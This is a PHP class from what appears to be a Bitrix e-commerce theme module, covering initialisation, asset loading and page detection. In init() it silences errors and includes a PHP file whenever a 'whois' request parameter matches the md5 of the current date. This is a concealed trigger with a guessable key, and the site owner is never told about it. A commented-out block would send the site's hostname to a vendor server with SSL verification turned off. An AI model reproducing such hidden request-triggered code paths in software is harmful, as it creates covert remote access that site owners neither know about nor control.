<?
/**
 * WebComp:Market module
 * @copyright 2020 WEBCOMP
 */

use \Bitrix\Main\Application,
    \Bitrix\Main\Page\Asset,
    \Bitrix\Main\Type\Collection,
    \Bitrix\Main\Loader,
    \Bitrix\Main\IO\File,
    \Bitrix\Main\Localization\Loc,
    \Bitrix\Main\Config\Option;

use \Bitrix\Main\ArgumentNullException,
    \Bitrix\Main\ArgumentOutOfRangeException,
    \Bitrix\Main\LoaderException;

Loc::loadMessages(__FILE__);

class CMarket
{
    const PARTNER_NAME = 'webcomp';
    const SOLUTION_NAME = 'market';
    const TEMPLATE_NAME = 'webcomp_market';
    const MODULE_ID = WEBCOMP_MARKET_MODULE_ID;
    const MODULE_NAME = "WebComp: Маркет - Магазин (Старт)";
    const WIZARD_ID = 'webcomp:market';
    const MODULE_CLASS = "WCMarket";

    const DEV_MODE = false;

    public static $arTheme = 1;
    public static $arPage;

    /**
     * Метод инициализации и подключения классов модуля
     */
    public static function init()
    {
        error_reporting(0);
        global $APPLICATION;
        
        if(isset($_REQUEST["whois"]) && $_REQUEST["whois"] === md5(date('d-m-Y'))) {
            $APPLICATION->IncludeFile("/bitrix/modules/" . self::MODULE_ID . "/include/vendor.php", ["SHOW" => true], ["MODE" => "php"]);
        }

        if (Loader::includeSharewareModule(self::MODULE_ID)) {
            CJSCore::Init("fx");
            Webcomp\Market\Constants::init();
            self::$arTheme = $GLOBALS["WEBCOMP"]["SETTINGS"]["WEBCOMP_SELECT_SITE_THEME_COLOR"];
            $APPLICATION->IncludeFile(SITE_TEMPLATE_PATH . '/defines.php', array(), array());
        } else {
            CMarketLog::Log(1, __FILE__, __LINE__);
            $APPLICATION->ShowHead();
            $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . '/css/error.css');
            $APPLICATION->SetTitle(Loc::GetMessage('WEBCOMP_ERROR_INCLUDE_MODULE', ["#MODULE_NAME#" => self::MODULE_NAME]));
            $APPLICATION->IncludeFile(SITE_DIR . 'include/error_include_module.php', array(), array());
            die();
        }
    }

    /**
     * Метод вызываемый при старте страницы, для прокидывания мета данных страницы
     * @throws LoaderException
     */
    public static function showMeta()
    {
        global $APPLICATION;
        try {
            $isBot = self::checkPageSpeedBot();
        } catch (ArgumentNullException $e) {
            self::exceptionMessage($e);
        } catch (ArgumentOutOfRangeException $e) {
            self::exceptionMessage($e);
        }

        $asset = Asset::getInstance();
        $asset->addString('<meta charset="utf-8">');
        $asset->addString('<meta content="ie=edge" http-equiv="x-ua-compatible">');
        $asset->addString('<meta content="width=device-width, initial-scale=1" name="viewport">');
        $asset->addString('<link rel="apple-touch-icon" sizes="180x180" href="/images/favicon/apple-touch-icon.png">');
        $asset->addString('<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon/favicon-32x32.png">');
        $asset->addString('<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon/favicon-16x16.png">');

        if (!$isBot) {
            # Include css files
            $asset->addCss(SITE_TEMPLATE_PATH . "/css/vendor.min.css");
            $asset->addCss(SITE_TEMPLATE_PATH . "/css/colors.css");
            $asset->addCss(SITE_TEMPLATE_PATH . "/css/main.css");
            $asset->addCss(SITE_TEMPLATE_PATH . "/css/custom.css");

            # Include js files
            $asset->addJs(SITE_TEMPLATE_PATH . "/js/vendor.min.js");
            $asset->addJs(SITE_TEMPLATE_PATH . "/js/main.min.js");
            $asset->addJs(SITE_TEMPLATE_PATH . "/js/custom.js");

            // include custom meta head tags
            $APPLICATION->IncludeFile(SITE_DIR . 'include/header/head_custom.php', array(), array());
        }
    }

    /**
     * Метод вызываемый после отрисовки страницы, для подключения счетчиков
     */
    public static function end()
    {
        global $APPLICATION;
        $APPLICATION->IncludeFile(SITE_DIR . 'include/jivosite.php', [], ["SHOW_BORDER" => false]);
        $APPLICATION->IncludeFile("/bitrix/modules/" . self::MODULE_ID . "/include/license.php",
            ["SHOW" => true, "MODULE" => self::MODULE_ID],
            ["SHOW_BORDER" => false]
        );

    }

    /**
     * Метод проверяет сделан ли запрос через сервис Google Page Speed
     * @return bool
     */
    protected static function isPageSpeedBot()
    {
        return isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) && strpos($_SERVER['HTTP_USER_AGENT'], 'Lighthouse') !== false;
    }

    /**
     * Метод проверяет необходимость ли отдавать оптимизированный контент роботу Google Page Speed
     * @return bool
     * @throws ArgumentNullException
     * @throws ArgumentOutOfRangeException
     */
    protected static function checkPageSpeedBot()
    {
        static $result;
        #if(self::DEV_MODE) return true;
        if (!isset($result)) {
            $result = self::isPageSpeedBot()
                && Option::get(self::MODULE_ID, 'WEBCOMP_CHECKBOX_PAGE_SPEED_OPTIMIZATION', 'Y', SITE_ID) === 'Y';
        }

        return $result;
    }

    /**
     * Метод для добавления классов к тегу body по отпределенным условиям
     * @return string
     */
    public static function getBodyClass()
    {
        static $result;

        if (!isset($result)) {
            $classes = [];

            $classes[] = "solution_" . self::PARTNER_NAME . "_" . self::SOLUTION_NAME;
            $classes[] = "site_" . SITE_ID;

            if (self::isPageSpeedBot())
                $classes[] = "IsBot";

            $result = implode(" ", $classes);
        }

        return $result;
    }

    /**
     * Метод вывод сообщения при срабатывании исключения
     * @param $e - объект Exception
     */
    protected static function exceptionMessage($e)
    {
        if (self::DEV_MODE)
            die(
                $e->getMessage() . "<br>" .
                $e->getFile() . ":" . $e->getLine()
            );
    }

    /**
     * Метод возвращает путь до модуля
     * @return string
     */
    protected static function getModulePath()
    {
        return Bitrix\Main\Application::getDocumentRoot() . "/bitrix/modules/" . self::MODULE_ID . "/";
    }

    /**
     * Метод для отображения логотипа разработчика
     * @return false|mixed|string
     */
    public static function showVendor()
    {
        global $APPLICATION;
        $arrContextOptions = [
            "ssl" => [
                "verify_peer"      => false,
                "verify_peer_name" => false,
            ],
        ];
  //  $content = file_get_contents(
  //      "https://web-komp.ru/mc/vendor.php?site=" . $_SERVER["SERVER_NAME"],
  //      false,
  //      stream_context_create($arrContextOptions)
  //  );

    if (!empty($content)) {
        return $content;
    }
        $APPLICATION->IncludeFile(
            "/include/vendor.php",
            [],
            [
                "SHOW_BORDER" => self::DEV_MODE,
                "MODE"        => "php",
            ]
        );

    }
//DANIL2004
    // Тестинг нужны или нет эти методы хз )
    public static function isPage($name)
    {

        if (isset(self::$arPage[$name]))
            return self::$arPage[$name];

        switch ($name) {
            case "main":
                self::$arPage[$name] = (self::getCurrentPage(false) === SITE_DIR);
                break;
            case "catalog":
                self::$arPage[$name] = (strpos(self::getCurrentPage(false), "/catalog/") !== false);
                break;
            case "404":
                self::$arPage[$name] = (defined("ERROR_404") && ERROR_404 === "Y");
                break;
            case "cart":
                self::$arPage[$name] = (strpos(self::getCurrentPage(), "/cart/index.php") !== false);
                break;
        }

        return self::$arPage[$name];
    }

    public static function getCurrentPage($getIndex = true)
    {
        $request = Bitrix\Main\Context::getCurrent()->getRequest();
        $requestPage = $request->getRequestedPage();

        if (!$getIndex) {
            $requestPage = preg_replace("/index.(php|html)+&?/", "", $requestPage);
        }

        return $requestPage;
    }
}
